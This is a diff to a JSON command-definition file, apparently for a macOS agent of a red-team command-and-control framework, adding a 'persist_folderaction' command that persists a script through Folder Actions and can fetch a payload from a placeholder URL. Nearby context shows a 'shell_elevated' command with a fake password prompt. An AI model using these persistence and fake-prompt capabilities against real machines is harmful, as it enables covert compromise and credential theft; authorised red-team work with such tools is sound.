@@ -57,6 +57,52 @@
       ],
       "artifacts": []
     },
+      {
+        "needs_admin": false,
+        "help_cmd": "persist_folderaction {\"folder\": \"/path/to/folder\", \"script_path\": \"/path/to/script/to/put/on/disk.scpt\", \"url\": \"http://url.of.hosted/payload\"}",
+        "version": 1,
+        "description": "Use Folder Actions to persist a compiled script on disk. You can either specify a 'URL' and automatically do a backgrounding one-liner, or supply your own code and language.",
+        "cmd": "persist_folderaction",
+        "parameters": [
+          {
+            "type": "String",
+            "hint": "osascript code",
+            "choices": "",
+            "required": false,
+            "name": "code"
+          },
+          {
+            "type": "String",
+            "hint": "http://url.of.hosted/payload",
+            "choices": "",
+            "required": false,
+            "name": "url"
+          },
+          {
+            "type": "String",
+            "hint": "/path/to/folder/to/watch",
+            "choices": "",
+            "required": true,
+            "name": "folder"
+          },
+          {
+            "type": "String",
+            "hint": "/path/to/script/to/create/on/disk",
+            "choices": "",
+            "required": true,
+            "name": "script_path"
+          },
+          {
+            "type": "Choice",
+            "hint": "",
+            "choices": "JavaScript\nAppleScript",
+            "required": false,
+            "name": "language"
+          }
+        ],
+        "attack": [],
+        "artifacts": []
+      },
     {
       "needs_admin":false,
       "help_cmd":"From the GUI: shell_elevated for a prompt, or shell_elevated {\"command\":\"whoami\",\"prompt\":\"my fake prompt\", \"use_creds\": \"false\"}",
